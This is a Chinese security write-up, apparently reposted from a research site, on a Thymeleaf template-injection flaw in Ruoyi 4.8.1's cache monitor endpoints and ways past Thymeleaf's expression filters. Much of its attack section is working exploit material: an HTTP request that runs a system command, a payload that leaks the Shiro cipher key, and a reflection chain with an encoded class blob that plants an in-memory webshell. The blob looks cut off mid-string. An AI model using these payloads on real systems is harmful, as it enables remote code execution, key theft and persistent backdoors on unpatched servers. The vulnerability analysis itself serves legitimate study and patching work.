# Ruoyi SSTI 与 Thymeleaf bypass深探
> 来源：https://xz.aliyun.com/news/92461

### 环境搭建

  
Ruoyi 4.8.1  
  

### 漏洞点

  
在 Ruoyi 4.8.1 的 `src/main/java/com/ruoyi/web/controller/monitor/CacheController.java` 中有如下代码。  
  
其在三个接口中使用了片段表达式，这将允许攻击者构造恶意SPEL表达式发送到后端进行攻击。  
  

```java
@Controller
@RequestMapping("/monitor/cache")
public class CacheController extends BaseController {
    private String prefix = "monitor/cache";

    @Autowired
    private CacheService cacheService;

    @RequiresPermissions("monitor:cache:view")
    @GetMapping()
    public String cache(ModelMap mmap) {
        mmap.put("cacheNames", cacheService.getCacheNames());
        return prefix + "/cache";
    }

    @RequiresPermissions("monitor:cache:view")
    @PostMapping("/getNames")
    public String getCacheNames(String fragment, ModelMap mmap) {
        mmap.put("cacheNames", cacheService.getCacheNames());
        return prefix + "/cache::" + fragment;
    }

    @RequiresPermissions("monitor:cache:view")
    @PostMapping("/getKeys")
    public String getCacheKeys(String fragment, String cacheName, ModelMap mmap) {
        mmap.put("cacheName", cacheName);
        mmap.put("cacheKeys", cacheService.getCacheKeys(cacheName));
        return prefix + "/cache::" + fragment;
    }

    @RequiresPermissions("monitor:cache:view")
    @PostMapping("/getValue")
    public String getCacheValue(String fragment, String cacheName, String cacheKey, ModelMap mmap) {
        mmap.put("cacheName", cacheName);
        mmap.put("cacheKey", cacheKey);
        mmap.put("cacheValue", cacheService.getCacheValue(cacheName, cacheKey));
        return prefix + "/cache::" + fragment;
    }

    ......
}
```

### 漏洞复现

  

```http
POST /monitor/cache/getNames HTTP/1.1
Host: 127.0.0.1
Accept: text/javascript, */*; q=0.01
Sec-Fetch-Mode: cors
sec-ch-ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
X-Requested-With: XMLHttpRequest
Sec-Fetch-Site: same-origin
Accept-Language: zh-CN,zh;q=0.9
X-CSRF-Token: JxbJuBkF+1WQAMT3u9i/sqsagEKm7GsXWD+mebzkmhs=
Cookie: JSESSIONID=1914f9e3-c29c-4946-9c06-da7f9b492a7c
sec-ch-ua-platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Dest: empty
Origin: http://127.0.0.1
Referer: http://127.0.0.1/monitor/job
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua-mobile: ?0
Content-Length: 372

fragment=__%7C$$%7B#response.getWriter().print(''.getClass().forName('java.lang.Runtime').getMethods.?%5Bname=='getRuntime'%5D%5B0%5D.invoke(null).getClass.getMethods.?%5Bname=='exec'%5D%5B1%5D.invoke(@securityManager.getClass().getClassLoader().loadClass('java.lang.Runtime').getMethods.?%5Bname=='getRuntime'%5D%5B0%5D.invoke(null),'open%20-a%20Calculator'))%7D%7C__
```

### 防御措施

  
在 `SpringRequestUtils#containsExpression` 中，存在用于检测字符串是否包含 Thymeleaf 表达式入口的逻辑。该函数通过线性扫描识别 `${...}、{...}、#{...}、@{...}、~{...}` 等表达式形式。当扫描到 `$、#、@、~` 等表达式起始符后，会将状态标记为 `expInit=true`，并继续判断后续字符是否为 `{`。  
  
但该实现没有正确处理重叠匹配场景。当 `expInit=true` 时，如果当前字符既不是 `{`，也不是空白字符，函数会直接将 `expInit` 重置为 `false`，并继续向后扫描；此时它不会重新判断当前字符本身是否同样可以作为新的表达式起始符。因此，在 `$${...}、##{...}、@@{...}` 等双写或相邻表达式起始符组合场景下，第二个起始符会被当作前一次匹配失败的普通字符消费掉，导致后续的 `{...}` 无法被该函数识别为合法表达式入口。  
  

```java
private static boolean containsExpression(final String text) {
    final int textLen = text.length();
    char c;
    boolean expInit = false;
    for (int i = 0; i < textLen; i++) {
        c = text.charAt(i);
        if (!expInit) {
            if (c == '$' || c == '*' || c == '#' || c == '@' || c == '~') {
                expInit = true;
            }
        } else {
            if (c == '{') {
                return true;
            } else if (!Character.isWhitespace(c)) {
                expInit = false;
            }
        }
    }
    return false;
}
```

在 `SpringStandardExpressionUtils#containsSpELInstantiationOrStaticOrParam` 方法中，其用于检测是否存在对象实例化和静态类/方法访问的情况，例如 `new SomeClass(...)` 还有 `T(SomeClass)` 这类型字符串。  
  

```java
public static boolean containsSpELInstantiationOrStaticOrParam(final String expression) {

    /*
     * Checks whether the expression contains instantiation of objects
     * ("new SomeClass") or makes use of
     * static methods ("T(SomeClass)") as both are forbidden in certain contexts in
     * restricted mode.
     */

    final int explen = expression.length();
    int n = explen;
    int ni = 0; // index for computing position in the NEW_ARRAY
    int pi = 0; // index for computing position in the PARAM_ARRAY
    char c;
    while (n-- != 0) {

        c = expression.charAt(n);

        // When checking for the "new" keyword, we need to identify that it is not a
        // part of a larger
        // identifier, i.e. there is whitespace after it and no character that might be
        // a part of an
        // identifier before it.
        if (ni < NEW_LEN
            && c == NEW_ARRAY[ni]
            && (ni > 0 || ((n + 1 < explen) && Character.isWhitespace(expression.charAt(n + 1))))) {
            ni++;
            if (ni == NEW_LEN && (n == 0 || !isSafeIdentifierChar(expression.charAt(n - 1)))) {
                return true; // we found an object instantiation
            }
            continue;
        }

        if (ni > 0) {
            // We 'restart' the matching counter just in case we had a partial match
            n += ni;
            ni = 0;
            continue;
        }

        ni = 0;

        // When checking for the "param" keyword, we need to identify that it is not a
        // part of a larger
        // identifier.
        if (pi < PARAM_LEN
            && c == PARAM_ARRAY[pi]
            && (pi > 0 || ((n + 1 < explen) && !isSafeIdentifierChar(expression.charAt(n + 1))))) {
            pi++;
            if (pi == PARAM_LEN && (n == 0 || !isSafeIdentifierChar(expression.charAt(n - 1)))) {
                return true; // we found a param access
            }
            continue;
        }

        if (pi > 0) {
            // We 'restart' the matching counter just in case we had a partial match
            n += pi;
            pi = 0;
            continue;
        }

        pi = 0;

        if (c == '(' && ((n - 1 >= 0) && isPreviousStaticMarker(expression, n))) {
            return true;
        }

    }

    return false;

}
```

### 绕过方式

  
我们首先来分析网上已公开的打法，以Ruoyi 4.8.1为例，通过回显ShiroKey，完成RCE。  
  

![image.png](https://i.im.ge/QMfXy4S/p2m-0c04f3f306.png)

  
  
我们来看Payload，`__...__` 是Thymeleaf中的表达式预处理机制，它的核心作用是：  
  
先执行 `__...__` 中的表达式，把结果替换回原位置，然后再让 Thymeleaf 按正常表达式继续解析。  
  
而 `|...|` 则是Thymeleaf的字面量替换语法，它的作用是：  
  
把中间内容当作一个字符串模板处理，里面可以嵌入 `${...}、#{...}、@{...}` 等表达式。  
  

#### Thymeleaf的字面量替换处理机制

  
这里我们通过双写 `$` 来绕过 `SpringRequestUtils#containsExpression` 的限制。但我们可以深入研究一下双写绕过后，Thymeleaf是如何处理双写表达式的。  
  
在Thymeleaf的 `ExpressionParsingUtil#performLiteralSubstitution` 中，单独的 `$` 仅会被视为字符，而 `${}` 则会被视为表达式。  
  

![image.png](https://i.im.ge/QMfXEt6/p2m-8d91319289.png)

  
  
因而Payload将会被解析为：  
  

```
'$' + ${#response.getWriter().print(''.getClass().forName('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(@securityManager.rememberMeManager.cipherKey))}
```

![image.png](https://i.im.ge/QMfXxzF/p2m-1ceef69162.png)

  
  
随后进入之后的解析中，值得注意的是，相同的表达式在第一次解析之后将会被缓存，相同的请求在后续过程中将不会触发断点。  
  

#### 绕过实例化检查

  
结合上文我们知道，`SpringStandardExpressionUtils#containsSpELInstantiationOrStaticOrParam` 方法修复了 Thymeleaf 3.0.12 版本中通过 `T (SomeClass)` 加空格的方式绕过检查的方式。且我们无法通过 `New` 的方式实例化对象。因而我们可以通过反射的方式来获得类并调用方法。基础的打法上文已经写了，下面我尝试研究了一下如何通过构造反射链的方式来直接注入内存马。  
  

#### 构造反射链并注入内存马

  
我们先通过 MemShellParty生成一个适合 SPEL注入的内存马。在 Payload 中，我们已无法通过 `T(SomeClass)` 获得类实例，但获得类实例不是我们的主要问题。  
  

![32e1a423-bbb6-45ff-9171-d278ac188cfc.png](https://i.im.ge/QMfXYFK/p2m-7ff341e3d1.png)

  
  
我们的主要问题是如何构造出符合方法签名的参数，对于静态方法我们通过 `Method.invoke(null)` 调用即可，但我们的内存马 Payload 中用到了 `java.util.zip.GZIPInputStream` ，其需要一个 `java.io.ByteArrayInputStream` 进行初始化。正常来想，我们获得类后直接通过构造方法构造一个出来不就行了么？但是不行，因为`java.io.ByteArrayInputStream` 需求一个 `Object[]` 对象，其第一个元素需要是 `decodeFromString` 返回的 `byte[]` 数组。  
  
经过尝试，我们发现在一个 `fragment` 中可以嵌套多个表达式语句，其共享一个上下文，可以在其中自定义注册变量与复制，其就可以直接解决问题。  
  

![image.png](https://i.im.ge/QMfXCqz/p2m-ffd3a8fdc2.png)

  
  

![image.png](https://i.im.ge/QMfXbj9/p2m-b98dc9d6f1.png)

  
  
我们将MemshellParty的注入语义转化为反射链条即可完成注入。  
  

```java
# 定义Object[]
*${#a=''.getClass().forName('java.lang.reflect.Array').getMethods.?[name=='newInstance'][0].invoke(null,''.getClass().forName('java.lang.Object'),1)},

# 设置decodeFromString返回的byte[]数组为Object[]的第一个元素
*${#a[0]=''.getClass().forName('org.springframework.util.Base64Utils').getMethods.?[name=='decodeFromString'][0].invoke(null,'H4sIAAAAAAAA%2F6V4CZwb13nf97hYAlyurl3R0lqWRCuWTe5wCWBxryRbuO9zcNOyPQAGA2AGM4OZwZlYiePYzmknTZuGOXuljHrScrukwsSSE0duc%2FVI3cPpfbepkqZXalkW%2Bz0Au9wl10fb%2FWHneO973%2Fn%2Fvve9%2BY23f%2BnzAOAkP0pgS9EEa28odw1rv80mh9ZIV%2BJLRlfSzUAIPNjjRpxV4mTBmm30%2BKZhhhUCK31dILCRujPJGlpXFp4hcEoRCZA6gXWBN4ISp%2BsZrs8TePjCxZPI3Sj%2BMqdyzQ5%2FuWMY6uUx37jc4eSWxGv65f4gpSQv%2B4dGJ8GJnGZwqa5u8DKvWeAsgQdQQoDTebdzwY6sqTGnHvcv%2F6xOe8Vn9zZcE9k6EnvKJBhlK3F3a5p2Cs1KPBUv%2B7meTxPUcLg28XXiHOuIRTIZuxzx5IVGt%2BixuQSbVlSrw363664bQ2Ma1rRirZH3xnt8xqbGKm6bGh22ku1ZihFGXCsnj4rDaD7o6ccZV2tmFRivY7fNDJmeaxzSx5q35uv0%2BqWwoiYrg4A6HuxWS4OM1xkp5VuxWaHi4gataDHX5ArlcLue6kwqhU6xWJYV25SpuTPT0rgjOkJTtcsmu5q7lBzMBpFOpeeOiZNy1F9rD8cFFzMdhqSKK1YbuJz2GNMUpwYzkdKNUnpcSE3SYsEj6VWpEckVOz6lrhldX9PRYmZTN9Ni2oLWGJXbjfY4nVVqLn%2B82tdSyWSyHXFwbE%2BtZONuR60WrtXdHmvQWerOilxLaM4Ux2ykxYbpoEsOZh3VVnqXkdlwvjFT%2BHG%2BHq7n2YlYiaRGSX6Q5m38LlsPGKo47nc8TENNdpOlqhFTXXLXP%2BKtuy3DPul04jYxHXXx5VhwWJtowrSUzbNGL6APx%2FlEeODq7IZCYU9TmXU6o16R1wUubhWy0njktCu29HBSK%2FKjqLUQ8CVVUXQEOoFcM2EfpCOZUKwiMvWQVhHUUTu6O%2B4b9WGh4W9lmcEk1A7HU6N0OMF2%2BwNGFBNBKT8YxBrdQb2Y6E%2BNYLgeSFfTQTHpmfoGtWK4ke8muHTEmAX0WCdR0%2BrJTsU6FbjaeJjl8kGHZAuN7VN7kgm5KpNYs6vapkJLjeTLs3ay7uwGq7ri8o2VSqLed%2FvHjnI1Zg323dWuXDQmRU%2Bn2%2BOSSm0oNqKjiD0YiyT7bElUir6yvz1pdK2NhtqaRO2eYDwn1yNiLZb3pqeid5RnS1IzqWYnvFuv8U6532IiQi7vEYpSuD%2BSpU4rkq1LufKkNJUizXRxVhz7OnpxEhrrwlSPxWspp93vFRNuKRmZ5Nq6FItm45XMbKgHZdG%2FW2mwciYmsezAr06azc7U52sIjdSUL2Y96rRWn42TjFRieyWZ1biC2ygkA61IpirGpKI7ptq79oZSnXS4lKooA083UWG8wQFT8ZYG3s4w5g4KSW0SqQwSvqro64QZkcuWO%2F7INMpKyaKv1wyrEc0t%2BmKiv1ntF%2BV4M1Lx5uz2iF4YtQRhXI72oolytxAfzuzJrtuQSp60XBoUw4mCPVDi%2FXVfSRsNIj53hUkwyVCpJ7HOXEhOFl0e2yytR%2FwsX6yx3CDj7uXZVKhdYzVXzOYVrWUvp0l9W702S%2Bi9SC4d6LApj0%2ByC0kjKg8FR9malfWYLehzdtI8a5dYw%2BkcZKWk2ErGR1k%2FPxLco4ir0SzbYx6735%2FoKHlHqe8uuti6PRv1aRlWHUn2oC9aYQpelvNKFSffFAXZlzeYqeQpaAGpG6mNNcYhhBvepgcB7QmUJgNXu%2BzKicKwGe17hVjZoe2G%2B4bc7uVqqd4oP61qs0HJG3OyijU3cVVZLZByleoTqz%2BwW047xX

# 创建 ByteArrayInputStream 实例，传递 Object[] 作为新建的内容
*${#x=''.getClass().forName('java.io.ByteArrayInputStream').getConstructor(''.getClass().forName('[B')).newInstance(#a)},

# 创建 GZIPInputStream 实例，传递 ByteArrayInputStream 作为新建的内容
*${#g=''.getClass().forName('java.util.zip.GZIPInputStream').getConstructor(''.getClass().forName('java.io.InputStream')).newInstance(#x)},

# 创建 URL 数组实例
*${#c=''.getClass().forName('java.lang.reflect.Array').getMethods.?[name=='newInstance'][0].invoke(null,''.getClass().forName('java.net.URL'),0)},

# 获得当前线程对象
*${#v=''.getClass().forName('java.lang.Thread').getMethods.?[name=='currentThread'][0].invoke(null)},

# 创建URLClassLoader实例
*${#b=''.getClass().forName('java.net.URLClassLoader').getConstructor(''.getClass().forName('[Ljava.net.URL;'),''.getClass().forName('java.lang.ClassLoader')).newInstance(#c,#v.getClass().getMethods.?[name=='getContextClassLoader'][0].invoke(#v))},

# 创建StreamUtils实例
*${#s=''.getClass().forName('org.springframework.util.StreamUtils').getMethods.?[name=='copyToByteArray'][0].invoke(null,#g)},

*${''.getClass().forName('org.springframework.cglib.core.ReflectUtils').getMethods.?[name=='defineClass'][1].invoke(null, 'Chat',#s,#b).newInstance()}
```

![image.png](https://i.im.ge/QMfXcWX/p2m-4a0e52e61a.png)

  
  
值得一提的是，该漏洞在Ruoyi 4.8.2 中同样存在，在 4.8.3 中得到修复。  
  
在调试过程中，不同版本的JDK通过getMethods返回的数组顺序可能会不同，需要使用合适的方法签名才能调用正确的方法完成注入。
